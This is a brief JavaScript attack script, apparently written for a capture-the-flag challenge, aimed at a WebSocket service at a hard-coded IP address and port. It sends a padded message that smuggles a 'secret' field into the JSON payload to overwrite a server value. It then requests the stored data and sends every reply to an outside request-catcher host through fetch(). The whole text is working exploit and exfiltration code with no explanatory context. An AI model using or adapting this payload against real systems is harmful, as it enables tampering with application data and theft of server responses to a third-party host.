const target = '188.166.175.0:31972';
const ws = new WebSocket(`ws://${target}/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
    ws.send(JSON.stringify({action:'get'}));
}
ws.onmessage = async (msg) => {
    fetch(`https://kek.requestcatcher/?kek=${msg.data}`);
}
